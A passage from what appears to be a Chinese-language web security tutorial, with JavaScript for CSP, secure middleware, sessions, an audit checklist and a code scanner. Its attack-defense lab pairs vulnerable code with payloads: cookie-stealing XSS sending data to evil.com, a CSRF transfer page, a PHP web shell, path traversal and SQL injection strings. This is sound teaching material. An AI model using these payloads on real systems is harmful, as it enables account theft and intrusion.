  website: 'https://alice.dev',
  bio: '<script>alert(1)</script>Hello World',
});

console.log(validationResult);
// {
//   valid: true,
//   data: {
//     username: 'alice123',
//     email: 'alice@example.com',
//     age: 25,
//     website: 'https://alice.dev/',
//     bio: '&lt;script&gt;alert(1)&lt;/script&gt;Hello World'
//   },
//   errors: {}
// }

```

---

## 4. 内容安全策略 (CSP)

### 4.1 CSP 完整指南

```js
// --- File: src/security/csp.js ---

/**
 * CSP (Content Security Policy) — XSS 的最后防线
 *
 * 核心思想: 告诉浏览器只允许加载指定来源的资源
 * 即使攻击者注入了恶意脚本，CSP 也能阻止执行
 *
 * 设置方式:
 * 1. HTTP 响应头: Content-Security-Policy
 * 2. Meta 标签: <meta http-equiv="Content-Security-Policy" content="...">
 */

// ==================== CSP 指令详解 ====================

const CSPDirectives = {
  // 默认回退 — 未指定指令时的默认值
  'default-src': "'self'",

  // 脚本来源
  'script-src': "'self' https://cdn.example.com",

  // 样式来源
  'style-src': "'self' 'unsafe-inline'",

  // 图片来源
  'img-src': "'self' data: https:",

  // 字体来源
  'font-src': "'self' https://fonts.gstatic.com",

  // AJAX/Fetch 目标
  'connect-src': "'self' https://api.example.com",

  // iframe 来源
  'frame-src': "'none'",

  // object/embed 来源（Flash 等）
  'object-src': "'none'",

  // base 标签来源
  'base-uri': "'self'",

  // 表单提交目标
  'form-action': "'self'",

  // 框架嵌入限制（替代 X-Frame-Options）
  'frame-ancestors': "'self'",

  // 报告端点
  'report-uri': '/csp-report',

  // 报告端点（新版）
  'report-to': 'csp-endpoint',
};

// ==================== CSP 策略生成器 ====================

/**
 * CSP 策略生成器
 */
class CSPBuilder {
  constructor() {
    this.directives = {};
    this.reportOnly = false;
  }

  /**
   * 设置默认来源
   */
  defaultSrc(...sources) {
    this.directives['default-src'] = sources;
    return this;
  }

  /**
   * 设置脚本来源
   */
  scriptSrc(...sources) {
    this.directives['script-src'] = sources;
    return this;
  }

  /**
   * 设置样式来源
   */
  styleSrc(...sources) {
    this.directives['style-src'] = sources;
    return this;
  }

  /**
   * 设置图片来源
   */
  imgSrc(...sources) {
    this.directives['img-src'] = sources;
    return this;
  }

  /**
   * 设置连接目标
   */
  connectSrc(...sources) {
    this.directives['connect-src'] = sources;
    return this;
  }

  /**
   * 设置 iframe 来源
   */
  frameSrc(...sources) {
    this.directives['frame-src'] = sources;
    return this;
  }

  /**
   * 禁止 object/embed
   */
  blockObjects() {
    this.directives['object-src'] = ["'none'"];
    return this;
  }

  /**
   * 设置表单提交目标
   */
  formAction(...sources) {
    this.directives['form-action'] = sources;
    return this;
  }

  /**
   * 设置框架嵌入限制
   */
  frameAncestors(...sources) {
    this.directives['frame-ancestors'] = sources;
    return this;
  }

  /**
   * 设置报告端点
   */
  reportTo(url) {
    this.directives['report-to'] = [`"${url}"`];
    return this;
  }

  /**
   * 使用 nonce 允许内联脚本
   */
  useNonce() {
    if (!this.directives['script-src']) {
      this.directives['script-src'] = [];
    }
    this.directives['script-src'].push("'nonce-{NONCE}'");
    this.directives['script-src'].push("'strict-dynamic'");
    return this;
  }

  /**
   * 升级为 HTTPS
   */
  upgradeInsecure() {
    this.directives['upgrade-insecure-requests'] = [];
    return this;
  }

  /**
   * 禁止 base 标签
   */
  blockBase() {
    this.directives['base-uri'] = ["'self'"];
    return this;
  }

  /**
   * 生成 CSP 头值
   */
  build() {
    const parts = [];
    for (const [directive, sources] of Object.entries(this.directives)) {
      if (sources.length === 0) {
        parts.push(directive);
      } else {
        parts.push(`${directive} ${sources.join(' ')}`);
      }
    }
    return parts.join('; ');
  }

  /**
   * Express 中间件
   */
  middleware(nonceGenerator) {
    const policy = this.build();

    return (req, res, next) => {
      // 生成 nonce
      const crypto = require('crypto');
      const nonce = crypto.randomBytes(16).toString('base64');

      // 替换 nonce 占位符
      const finalPolicy = policy.replace(/\{NONCE\}/g, nonce);

      // 设置响应头
      const headerName = this.reportOnly
        ? 'Content-Security-Policy-Report-Only'
        : 'Content-Security-Policy';
      res.setHeader(headerName, finalPolicy);

      // 将 nonce 暴露给模板
      res.locals.cspNonce = nonce;

      next();
    };
  }
}

// ==================== 预设 CSP 策略 ====================

const CSPPresets = {
  /**
   * 严格策略 — 生产环境推荐
   * 仅允许同源资源，禁止内联脚本
   */
  strict() {
    return new CSPBuilder()
      .defaultSrc("'self'")
      .scriptSrc("'self'")
      .styleSrc("'self'")
      .imgSrc("'self'", 'data:', 'https:')
      .fontSrc("'self'")
      .connectSrc("'self'")
      .frameSrc("'none'")
      .blockObjects()
      .blockBase()
      .formAction("'self'")
      .frameAncestors("'self'")
      .upgradeInsecure()
      .build();
  },

  /**
   * 带 Nonce 策略 — 需要内联脚本时使用
   */
  withNonce() {
    return new CSPBuilder()
      .defaultSrc("'self'")
      .useNonce()
      .styleSrc("'self'", "'nonce-{NONCE}'")
      .imgSrc("'self'", 'data:', 'https:')
      .connectSrc("'self'")
      .frameSrc("'none'")
      .blockObjects()
      .build();
  },

  /**
   * 宽松策略 — 开发环境
   */
  development() {
    return new CSPBuilder()
      .defaultSrc("'self'", "'unsafe-inline'", "'unsafe-eval'")
      .build();
  },

  /**
   * 仅报告策略 — 迁移期使用
   * 不阻止，只报告违规行为
   */
  reportOnly() {
    const builder = new CSPBuilder();
    builder.reportOnly = true;
    return builder
      .defaultSrc("'self'")
      .scriptSrc("'self'")
      .reportTo('/csp-report')
      .build();
  },
};

// ==================== CSP Nonce 使用示例 ====================

/**
 * 使用 Nonce 允许特定的内联脚本
 *
 * 原理:
 * 1. 服务器为每个请求生成随机 nonce
 * 2. CSP 头中声明允许的 nonce
 * 3. 内联脚本标签带上相同的 nonce
 * 4. 浏览器只执行带有效 nonce 的内联脚本
 * 5. 攻击者无法猜测 nonce（每次请求不同）
 */
const NonceExample = {
  /**
   * Express 路由示例
   */
  route(app) {
    const crypto = require('crypto');

    app.get('/page', (req, res) => {
      // 生成 nonce
      const nonce = crypto.randomBytes(16).toString('base64');

      // 设置 CSP 头
      res.setHeader(
        'Content-Security-Policy',
        `default-src 'self'; script-src 'self' 'nonce-${nonce}'`
      );

      // 渲染页面，内联脚本带 nonce
      res.send(`
        <!DOCTYPE html>
        <html>
        <head>
          <script nonce="${nonce}">
            // ✅ 这个脚本会被执行（有有效 nonce）
            console.log('Page loaded');
          </script>
        </head>
        <body>
          <h1>Secure Page</h1>
          <script nonce="${nonce}">
            // ✅ 这个也会被执行
            document.getElementById('status').textContent = 'OK';
          </script>
          <script>
            // ❌ 这个会被 CSP 阻止（无 nonce）
            alert('XSS');
          </script>
        </body>
        </html>
      `);
    });
  },

  /**
   * 模板引擎集成（EJS 示例）
   */
  ejsTemplate() {
    return `
      <!DOCTYPE html>
      <html>
      <head>
        <script nonce="<%= cspNonce %>">
          // 安全内联脚本
          window.APP_CONFIG = <%- JSON.stringify(config) %>;
        </script>
      </head>
      <body>
        <div id="app"></div>
        <script nonce="<%= cspNonce %>" src="/js/app.js"></script>
      </body>
      </html>
    `;
  },
};

// ==================== CSP 报告处理 ====================

/**
 * CSP 违规报告端点
 */
const CSPReportHandler = {
  /**
   * Express 路由：接收 CSP 违规报告
   */
  setup(app) {
    app.post('/csp-report', (req, res) => {
      const report = req.body?.['csp-report'] || req.body;

      console.log('CSP Violation Report:', {
        violatedDirective: report['violated-directive'],
        blockedURI: report['blocked-uri'],
        lineNumber: report['line-number'],
        sourceFile: report['source-file'],
        userAgent: req.headers['user-agent'],
        referrer: req.headers.referer,
      });

      // 可以发送到监控服务（Sentry、Datadog 等）
      // monitor.send('csp-violation', report);

      res.status(204).send();
    });
  },
};

// ==================== CSP 攻防演练 ====================

/**
 * 演练: CSP 如何阻止 XSS
 */
const CSPExercise = {
  // 攻击者注入恶意脚本
  attack() {
    const injectedScript = `<script>fetch('https://evil.com/steal?data='+document.cookie)</script>`;

    // 没有 CSP: 脚本执行 ✅
    // 有 CSP (script-src 'self'): 脚本被阻止 ❌
    // 浏览器控制台显示:
    // "Refused to execute inline script because it violates the following
    //  Content Security Policy directive: 'script-src 'self''."

    return injectedScript;
  },

  // 防御者设置 CSP
  defend() {
    // 最简 CSP 就能阻止大部分 XSS
    return "Content-Security-Policy: default-src 'self'";

    // 效果:
    // - 阻止内联脚本 ✅
    // - 阻止外部脚本（非同源）✅
    // - 阻止 javascript: URL ✅
    // - 阻止 eval() ✅
  },
};

```

---

## 5. 综合安全架构

### 5.1 安全中间件组合

```js
// --- File: src/security/security-middleware.js ---

/**
 * 综合安全中间件 — 生产环境推荐配置
 *
 * 防御层次:
 * 1. 安全 Headers (Helmet)
 * 2. 输入验证 + 净化
 * 3. CSRF 保护
 * 4. CSP
 * 5. 速率限制
 * 6. 安全 Cookie
 */

const SecurityMiddleware = {
  /**
   * 安全 Headers（Helmet 替代实现）
   */
  headers() {
    return (req, res, next) => {
      // 禁止 MIME 类型嗅探
      res.setHeader('X-Content-Type-Options', 'nosniff');

      // XSS 保护（旧浏览器）
      res.setHeader('X-XSS-Protection', '0'); // 现代浏览器用 CSP 替代

      // 禁止嵌入框架
      res.setHeader('X-Frame-Options', 'DENY');

      // 内容安全策略
      res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'self'"
      );

      // 强制 HTTPS
      res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');

      // 引用策略
      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

      // 权限策略
      res.setHeader(
        'Permissions-Policy',
        'camera=(), microphone=(), geolocation=(), payment=()'
      );

      next();
    };
  },

  /**
   * 安全 Cookie 配置
   */
  secureCookies() {
    return (req, res, next) => {
      const originalCookie = res.cookie.bind(res);
      res.cookie = (name, value, options = {}) => {
        originalCookie(name, value, {
          httpOnly: true, // 禁止 JS 访问
          secure: true, // 仅 HTTPS
          sameSite: 'lax', // CSRF 保护
          maxAge: 24 * 60 * 60 * 1000, // 24 小时
          ...options,
        });
      };
      next();
    };
  },

  /**
   * 请求大小限制
   */
  bodyLimit(maxSize = '1mb') {
    return (req, res, next) => {
      const contentLength = parseInt(req.headers['content-length'], 10);
      if (contentLength > parseInt(maxSize, 10) * 1024 * 1024) {
        return res.status(413).json({ error: 'Request body too large' });
      }
      next();
    };
  },

  /**
   * 安全 JSON 解析
   */
  safeJSON() {
    return (req, res, next) => {
      if (req.headers['content-type']?.includes('application/json')) {
        let body = '';
        req.on('data', (chunk) => {
          body += chunk;
          // 限制 JSON 大小
          if (body.length > 1024 * 1024) {
            req.destroy();
            return res.status(413).json({ error: 'JSON too large' });
          }
        });
        req.on('end', () => {
          try {
            req.body = JSON.parse(body);
          } catch {
            return res.status(400).json({ error: 'Invalid JSON' });
          }
          next();
        });
      } else {
        next();
      }
    };
  },
};

// ==================== 安全 API 设计模式 ====================

/**
 * 安全 API 设计 — 最佳实践
 */
const SecureAPI = {
  /**
   * 安全路由模板
   */
  secureRoute(app, path, handler) {
    app.post(path,
      // 1. 速率限制
      // rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }),
      // 2. 输入验证
      // validate(schema),
      // 3. 认证
      // authenticate,
      // 4. 授权
      // authorize('admin'),
      // 5. CSRF 保护
      // csrfProtection,
      handler
    );
  },

  /**
   * 安全响应 — 不泄露敏感信息
   */
  safeResponse(res, data, options = {}) {
    const { excludeFields = ['password', 'token', 'secret'] } = options;

    // 移除敏感字段
    const safeData = JSON.parse(JSON.stringify(data));
    this.removeFields(safeData, excludeFields);

    res.json({
      success: true,
      data: safeData,
      // 不返回: 服务器版本、数据库信息、堆栈跟踪
    });
  },

  /**
   * 递归移除字段
   */
  removeFields(obj, fields) {
    if (!obj || typeof obj !== 'object') return;
    for (const field of fields) {
      delete obj[field];
    }
    for (const value of Object.values(obj)) {
      if (Array.isArray(value)) {
        value.forEach((item) => this.removeFields(item, fields));
      } else if (value && typeof value === 'object') {
        this.removeFields(value, fields);
      }
    }
  },

  /**
   * 安全错误处理 — 不泄露内部细节
   */
  errorHandler(err, req, res, next) {
    // 记录详细错误（仅服务器日志）
    console.error('Internal Error:', err);

    // 返回通用错误消息（客户端）
    const isProduction = process.env.NODE_ENV === 'production';
    res.status(err.status || 500).json({
      success: false,
      error: isProduction
        ? 'An internal error occurred'
        : err.message,
      // 生产环境不返回: stack, code, details
    });
  },
};

// ==================== 安全密码处理 ====================

/**
 * 密码安全最佳实践
 */
const PasswordSecurity = {
  /**
   * 密码哈希（使用 bcrypt）
   */
  async hashPassword(password) {
    const bcrypt = require('bcrypt');
    const saltRounds = 12; // 推荐 12+
    return bcrypt.hash(password, saltRounds);
  },

  /**
   * 验证密码
   */
  async verifyPassword(password, hash) {
    const bcrypt = require('bcrypt');
    return bcrypt.compare(password, hash);
  },

  /**
   * 密码强度验证
   */
  validateStrength(password) {
    const checks = {
      minLength: password.length >= 12,
      hasUpper: /[A-Z]/.test(password),
      hasLower: /[a-z]/.test(password),
      hasNumber: /[0-9]/.test(password),
      hasSpecial: /[!@#$%^&*(),.?":{}|<>]/.test(password),
      noCommon: !this.isCommonPassword(password),
    };

    return {
      valid: Object.values(checks).every(Boolean),
      score: Object.values(checks).filter(Boolean).length,
      checks,
    };
  },

  /**
   * 检查常见密码
   */
  isCommonPassword(password) {
    const commonPasswords = new Set([
      'password', '123456', '12345678', 'qwerty', 'abc123',
      'password123', 'admin', 'letmein', 'welcome',
    ]);
    return commonPasswords.has(password.toLowerCase());
  },
};

// ==================== 安全会话管理 ====================

/**
 * 安全会话配置
 */
const SecureSession = {
  /**
   * Express Session 安全配置
   */
  config(app, secret) {
    const session = require('express-session');
    const MongoStore = require('connect-mongo'); // 或 RedisStore

    app.use(
      session({
        store: MongoStore.create({ mongoUrl: process.env.MONGO_URI }),
        secret: secret,
        name: '__session', // 不暴露技术栈
        resave: false,
        saveUninitialized: false,
        cookie: {
          httpOnly: true,
          secure: process.env.NODE_ENV === 'production',
          sameSite: 'lax',
          maxAge: 24 * 60 * 60 * 1000,
        },
        rolling: false, // 不每次请求刷新
      })
    );
  },

  /**
   * 会话固定攻击防护
   */
  regenerateSession(req) {
    return new Promise((resolve, reject) => {
      req.session.regenerate((err) => {
        if (err) reject(err);
        else resolve();
      });
    });
  },

  /**
   * 登录时轮换会话 ID
   */
  async onLogin(req) {
    await this.regenerateSession(req);
    req.session.createdAt = Date.now();
    req.session.lastActivity = Date.now();
  },
};

```

---

## 6. 攻防演练实验室

### 6.1 完整攻防场景

```js
// --- File: src/security/attack-lab.js ---

/**
 * 攻防演练实验室
 * 每个场景包含: 攻击向量 → 漏洞代码 → 利用方式 → 防御方案
 */

// ==================== 场景 1: 评论系统 Stored XSS ====================

/**
 * 场景: 博客评论系统
 * 攻击者注入恶意脚本，所有查看评论的用户受害
 */
const Lab1_StoredXSS = {
  // 漏洞代码
  vulnerable: {
    // 后端
    saveComment(req, res) {
      const { postId, content, author } = req.body;
      // ❌ 直接存入数据库，未净化
      db.run(
        'INSERT INTO comments (post_id, content, author) VALUES (?, ?, ?)',
        [postId, content, author]
      );
      res.json({ success: true });
    },

    // 前端
    renderComments(comments) {
      const container = document.getElementById('comments');
      // ❌ innerHTML 直接渲染用户内容
      container.innerHTML = comments
        .map(
          (c) => `
          <div class="comment">
            <strong>${c.author}</strong>
            <p>${c.content}</p>
          </div>
        `
        )
        .join('');
    },
  },

  // 攻击利用
  exploit: {
    // 攻击者提交
    maliciousComment: {
      content:
        '<img src=x onerror="const i=new Image();i.src=`https://evil.com/steal?cookie=${encodeURIComponent(document.cookie)}&url=${encodeURIComponent(location.href)}`">',
      author: '<script>document.write('XSS')</script>',
    },

    // 效果:
    // 1. 任何用户查看该评论，脚本自动执行
    // 2. Cookie 被发送到攻击者服务器
    // 3. 攻击者用盗取的 Cookie 冒充用户
  },

  // 防御方案
  defend: {
    // 1. 后端净化
    saveComment(req, res) {
      const sanitizer = new HTMLSanitizer();
      const { postId, content, author } = req.body;

      // ✅ 净化后存入
      db.run(
        'INSERT INTO comments (post_id, content, author) VALUES (?, ?, ?)',
        [postId, sanitizer.sanitize(content), sanitizer.sanitize(author)]
      );
      res.json({ success: true });
    },

    // 2. 前端安全渲染
    renderComments(comments) {
      const container = document.getElementById('comments');
      comments.forEach((c) => {
        const div = document.createElement('div');
        div.className = 'comment';

        const strong = document.createElement('strong');
        strong.textContent = c.author; // ✅ textContent 自动转义

        const p = document.createElement('p');
        p.textContent = c.content; // ✅ textContent 自动转义

        div.appendChild(strong);
        div.appendChild(p);
        container.appendChild(div);
      });
    },

    // 3. CSP 头
    // Content-Security-Policy: default-src 'self'; script-src 'self'
  },
};

// ==================== 场景 2: 搜索页面 Reflected XSS ====================

/**
 * 场景: 电商网站搜索
 * 攻击者构造恶意搜索链接，诱骗用户点击
 */
const Lab2_ReflectedXSS = {
  vulnerable: {
    // 后端模板
    renderSearch(query, results) {
      // ❌ 直接插入用户输入
      return `
        <h1>搜索结果: ${query}</h1>
        <p>找到 ${results.length} 个结果</p>
        ${results.map((r) => `<div class="product">${r.name}</div>`).join('')}
      `;
    },
  },

  exploit: {
    // 恶意链接
    maliciousUrl:
      'https://shop.com/search?q=<script>fetch("https://evil.com/steal?data="+document.cookie)</script>',

    // 钓鱼方式:
    // 1. 短链接服务隐藏恶意 URL
    // 2. 社交媒体/邮件发送
    // 3. 用户点击后触发
  },

  defend: {
    // 1. 输出编码
    renderSearch(query, results) {
      const encoded = htmlEncode(query);
      return `
        <h1>搜索结果: ${encoded}</h1>
        <p>找到 ${results.length} 个结果</p>
        ${results.map((r) => `<div class="product">${htmlEncode(r.name)}</div>`).join('')}
      `;
    },

    // 2. CSP
    // Content-Security-Policy: default-src 'self'; script-src 'self'
  },
};

// ==================== 场景 3: 转账 CSRF ====================

/**
 * 场景: 银行转账
 * 攻击者诱骗已登录用户发起转账请求
 */
const Lab3_CSRF = {
  vulnerable: {
    // 后端 — 无 CSRF 保护
    transfer(req, res) {
      const { to, amount } = req.body;
      // ❌ 仅验证 Cookie（浏览器自动发送）
      if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
      }
      // ❌ 无 CSRF Token 验证
      db.run('UPDATE accounts SET balance = balance - ? WHERE id = ?', [
        amount,
        req.session.userId,
      ]);
      res.json({ success: true });
    },
  },

  exploit: {
    // 恶意页面
    evilPage: `
      <html>
      <body>
        <h1>恭喜中奖!</h1>
        <form id="attack" action="https://bank.com/api/transfer" method="POST">
          <input type="hidden" name="to" value="attacker_account">
          <input type="hidden" name="amount" value="100000">
        </form>
        <script>document.getElementById('attack').submit()</script>
      </body>
      </html>
    `,

    // 效果: 已登录用户在访问恶意页面时自动转账
  },

  defend: {
    // 1. SameSite Cookie
    cookieConfig: {
      sameSite: 'lax',
      secure: true,
      httpOnly: true,
    },

    // 2. CSRF Token
    transfer(req, res) {
      const token = req.headers['x-csrf-token'];
      if (!token || token !== req.session.csrfToken) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
      }
      // ... 继续处理
    },

    // 3. Origin 验证
    // 4. 二次确认（短信/邮箱验证码）
  },
};

// ==================== 场景 4: 用户资料 DOM-based XSS ====================

/**
 * 场景: 用户资料页
 * 从 URL 读取用户名并显示
 */
const Lab4_DOMXSS = {
  vulnerable: {
    init() {
      // ❌ 从 URL 读取并直接插入 DOM
      const params = new URLSearchParams(location.search);
      const name = params.get('name');
      document.getElementById('greeting').innerHTML = `<h1>欢迎, ${name}!</h1>`;

      // ❌ 从 hash 读取
      const section = location.hash.slice(1);
      document.getElementById('content').innerHTML = section;
    },
  },

  exploit: {
    maliciousUrl:
      'https://app.com/profile?name=<img src=x onerror=alert(document.cookie)>',
  },

  defend: {
    init() {
      const params = new URLSearchParams(location.search);
      const name = params.get('name');

      // ✅ 使用 textContent
      document.getElementById('greeting').innerHTML = '<h1></h1>';
      document.getElementById('greeting').querySelector('h1').textContent = `欢迎, ${name}!`;

      // ✅ 或使用安全的模板系统
      // document.getElementById('greeting').textContent = `欢迎, ${name}!`;
    },
  },
};

// ==================== 场景 5: 文件上传漏洞 ====================

/**
 * 场景: 用户头像上传
 * 攻击者上传恶意文件
 */
const Lab5_FileUpload = {
  vulnerable: {
    // 后端
    async uploadAvatar(req, res) {
      const file = req.file;
      // ❌ 仅检查文件扩展名
      const allowed = ['.jpg', '.png', '.gif'];
      if (!allowed.includes(path.extname(file.originalname))) {
        return res.status(400).json({ error: 'Invalid file type' });
      }

      // ❌ 直接保存到公开目录
      const dest = `public/avatars/${file.originalname}`;
      await fs.writeFile(dest, file.buffer);

      res.json({ url: `/avatars/${file.originalname}` });
    },
  },

  exploit: {
    // 攻击 1: 上传 PHP/JS 文件
    attack1: { filename: 'shell.php', content: '<?php system($_GET["cmd"]); ?>' },

    // 攻击 2: 内容类型欺骗
    attack2: {
      filename: 'avatar.jpg',
      contentType: 'image/jpeg', // 伪装
      actualContent: '<script>document.location="https://evil.com"</script>',
    },

    // 攻击 3: 路径遍历
    attack3: { filename: '../../../etc/passwd' },
  },

  defend: {
    async uploadAvatar(req, res) {
      const file = req.file;

      // 1. ✅ 验证文件类型（Magic Number，不只是扩展名）
      const magicNumbers = {
        jpg: [0xff, 0xd8, 0xff],
        png: [0x89, 0x50, 0x4e, 0x47],
        gif: [0x47, 0x49, 0x46, 0x38],
      };

      const header = file.buffer.slice(0, 4);
      const isValidImage = Object.values(magicNumbers).some((magic) =>
        header.slice(0, magic.length).equals(Buffer.from(magic))
      );

      if (!isValidImage) {
        return res.status(400).json({ error: 'Invalid file content' });
      }

      // 2. ✅ 重命名文件（避免路径遍历和覆盖）
      const crypto = require('crypto');
      const safeName = crypto.randomBytes(16).toString('hex') + '.jpg';

      // 3. ✅ 保存到非公开目录
      const dest = `uploads/avatars/${safeName}`;
      await fs.writeFile(dest, file.buffer);

      // 4. ✅ 通过 API 端点提供访问（不直接暴露文件）
      res.json({ url: `/api/avatars/${safeName}` });
    },

    // 5. ✅ 图片处理（压缩 + 剥离元数据）
    async processImage(buffer) {
      const sharp = require('sharp');
      return sharp(buffer)
        .resize(200, 200, { fit: 'cover' })
        .jpeg({ quality: 80 })
        .toBuffer();
    },
  },
};

// ==================== 场景 6: SQL 注入 ====================

/**
 * 场景: 用户登录
 * 攻击者绕过认证
 */
const Lab6_SQLInjection = {
  vulnerable: {
    // 后端
    async login(req, res) {
      const { username, password } = req.body;

      // ❌ 字符串拼接 SQL
      const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
      const user = await db.query(query);

      if (user) {
        req.session.userId = user.id;
        res.json({ success: true });
      } else {
        res.status(401).json({ error: 'Invalid credentials' });
      }
    },
  },

  exploit: {
    // 攻击 1: 绕过认证
    bypassAuth: {
      username: "' OR '1'='1' --",
      password: 'anything',
    },
    // 生成的 SQL:
    // SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
    // -- 注释掉后面的密码检查

    // 攻击 2: 数据提取
    extractData: {
      username: "' UNION SELECT id, password, email, credit_card FROM users --",
      password: '',
    },
  },

  defend: {
    // 1. ✅ 参数化查询
    async login(req, res) {
      const { username, password } = req.body;

      // ✅ 参数化查询（预编译语句）
      const user = await db.query(
        'SELECT * FROM users WHERE username = ? AND password = ?',
        [username, password]
      );

      if (user) {
        req.session.userId = user.id;
        res.json({ success: true });
      } else {
        res.status(401).json({ error: 'Invalid credentials' });
      }
    },

    // 2. ✅ ORM（Sequelize/Prisma 默认参数化）
    // 3. ✅ 输入验证
    // 4. ✅ 最小权限原则（数据库用户仅必要权限）
  },
};

// ==================== 场景 7: 敏感信息泄露 ====================

/**
 * 场景: API 返回过多数据
 */
const Lab7_InfoLeak = {
  vulnerable: {
    // 后端
    getUser(req, res) {
      const user = db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
      // ❌ 返回所有字段（包括密码哈希、内部 ID 等）
      res.json(user);
    },

    // 错误处理
    errorHandler(err, req, res, next) {
      // ❌ 返回完整堆栈和内部信息
      res.status(500).json({
        error: err.message,
        stack: err.stack,
        query: err.query, // 泄露 SQL 语句
        connection: err.connection, // 泄露数据库连接信息
      });
    },
  },

  exploit: {
    // 从响应中提取:
    // - 密码哈希 → 离线破解
    // - 数据库结构 → 针对性 SQL 注入
    // - 服务器路径 → 路径遍历攻击
    // - 内部 API → 未授权访问
  },

  defend: {
    // 1. ✅ 选择性返回字段
    getUser(req, res) {
      const user = db.query(
        'SELECT id, username, email, avatar, created_at FROM users WHERE id = ?',
        [req.params.id]
      );
      res.json({ id: user.id, username: user.username, email: user.email, avatar: user.avatar });
    },

    // 2. ✅ 安全错误处理
    errorHandler(err, req, res, next) {
      console.error('Internal error:', err); // 仅服务器日志
      res.status(500).json({ error: 'An internal error occurred' }); // 通用消息
    },

    // 3. ✅ 移除响应头中的技术栈信息
    // X-Powered-By: Express → 移除
  },
};

```

---

## 7. 安全审计清单

### 7.1 完整安全检查表

```js
// --- File: src/security/audit-checklist.js ---

/**
 * Web 应用安全审计清单
 *
 * 每个项目需要定期审查，确保安全措施到位
 */
const SecurityAuditChecklist = {
  // ==================== XSS 防护 ====================
  xss: [
    '✅ 所有用户输入在输出到 HTML 时都经过编码',
    '✅ 不使用 innerHTML 插入不可信数据',
    '✅ 使用 textContent 代替 innerHTML',
    '✅ URL 参数不直接插入 DOM',
    '✅ location.hash 不直接用于 DOM 操作',
    '✅ 富文本使用 DOMPurify 净化',
    '✅ CSP 头已配置',
    '✅ 不使用 eval() 执行用户数据',
    '✅ 不使用 setTimeout/setInterval 传入字符串',
    '✅ 模板引擎使用自动转义模式',
  ],

  // ==================== CSRF 防护 ====================
  csrf: [
    '✅ Cookie 设置 SameSite 属性',
    '✅ 状态变更请求（POST/PUT/DELETE）有 CSRF Token',
    '✅ AJAX 请求携带 CSRF Token',
    '✅ 敏感操作有二次确认',
    '✅ 重要操作验证 Origin/Referer',
    '✅ GET 请求不执行状态变更',
  ],

  // ==================== 输入验证 ====================
  input: [
    '✅ 所有输入经过类型验证',
    '✅ 字符串输入有长度限制',
    '✅ 文件上传验证 Magic Number',
    '✅ 文件上传重命名（不保留原始文件名）',
    '✅ SQL 查询使用参数化',
    '✅ 命令执行使用参数数组（非字符串拼接）',
    '✅ URL 输入验证协议白名单',
    '✅ 邮箱/电话等格式验证',
  ],

  // ==================== 认证与授权 ====================
  auth: [
    '✅ 密码使用 bcrypt/Argon2 哈希',
    '✅ 登录失败不泄露具体原因（统一消息）',
    '✅ 会话 ID 随机且足够长',
    '✅ 登录后轮换会话 ID',
    '✅ 敏感操作要求重新认证',
    '✅ API 有认证中间件',
    '✅ 资源访问有授权检查',
    '✅ Token 有过期时间',
    '✅ 支持注销（清除服务端会话）',
  ],

  // ==================== 安全 Headers ====================
  headers: [
    '✅ Content-Security-Policy 已配置',
    '✅ Strict-Transport-Security 已配置',
    '✅ X-Content-Type-Options: nosniff',
    '✅ X-Frame-Options: DENY',
    '✅ Referrer-Policy 已配置',
    '✅ Permissions-Policy 已配置',
    '✅ 移除 X-Powered-By 头',
    '✅ 移除 Server 头（或自定义）',
  ],

  // ==================== 数据安全 ====================
  data: [
    '✅ API 不返回敏感字段（密码、Token）',
    '✅ 错误消息不泄露内部信息',
    '✅ 日志不记录密码/Token',
    '✅ 敏感数据传输使用 HTTPS',
    '✅ 敏感数据静态加密',
    '✅ 数据库连接字符串不硬编码',
    '✅ 使用环境变量管理密钥',
    '✅ .env 文件在 .gitignore 中',
  ],

  // ==================== 依赖安全 ====================
  dependencies: [
    '✅ 定期运行 npm audit',
    '✅ 及时更新依赖',
    '✅ 锁定依赖版本（package-lock.json）',
    '✅ 不使用来源不明的包',
    '✅ 生产环境不安装 devDependencies',
  ],

  // ==================== 其他 ====================
  other: [
    '✅ 速率限制已配置',
    '✅ CORS 策略最小化',
    '✅ 文件上传限制大小和类型',
    '✅ 上传文件不直接可执行',
    '✅ 定期安全扫描',
    '✅ 有安全事件响应计划',
  ],
};

// ==================== 自动化安全扫描 ====================

/**
 * 自动化安全扫描工具
 */
const SecurityScanner = {
  /**
   * 扫描代码中的常见安全问题
   */
  scanCode(sourceCode) {
    const issues = [];

    // XSS 检测
    const xssPatterns = [
      { regex: /\.innerHTML\s*=/, severity: 'high', message: 'innerHTML 赋值可能引发 XSS' },
      { regex: /document\.write\(/, severity: 'high', message: 'document.write 可能引发 XSS' },
      { regex: /eval\(/, severity: 'high', message: 'eval 执行可能引发代码注入' },
      { regex: /new\s+Function\(/, severity: 'medium', message: 'Function 构造函数可能引发代码注入' },
      { regex: /setTimeout\(['"`]/, severity: 'medium', message: 'setTimeout 传入字符串可能引发代码注入' },
      { regex: /location\.hash/, severity: 'low', message: 'location.hash 使用需验证' },
      { regex: /location\.search/, severity: 'low', message: 'location.search 使用需验证' },
    ];

    // SQL 注入检测
    const sqlPatterns = [
      {
        regex: /query\s*\(\s*`[^`]*\$\{[^}]*\}/,
        severity: 'critical',
        message: '模板字符串拼接 SQL 可能引发 SQL 注入',
      },
      {
        regex: /query\s*\([^)]*\+\s*\w+/,
        severity: 'critical',
        message: '字符串拼接 SQL 可能引发 SQL 注入',
      },
    ];

    // 敏感信息检测
    const infoPatterns = [
      { regex: /password\s*[:=]\s*['"][^'"]*['"]/, severity: 'high', message: '硬编码密码' },
      { regex: /secret\s*[:=]\s*['"][^'"]*['"]/, severity: 'high', message: '硬编码密钥' },
      { regex: /api[_-]?key\s*[:=]\s*['"][^'"]*['"]/, severity: 'high', message: '硬编码 API Key' },
      { regex: /token\s*[:=]\s*['"][^'"]*['"]/, severity: 'medium', message: '硬编码 Token' },
    ];

    const allPatterns = [...xssPatterns, ...sqlPatterns, ...infoPatterns];

    for (const pattern of allPatterns) {
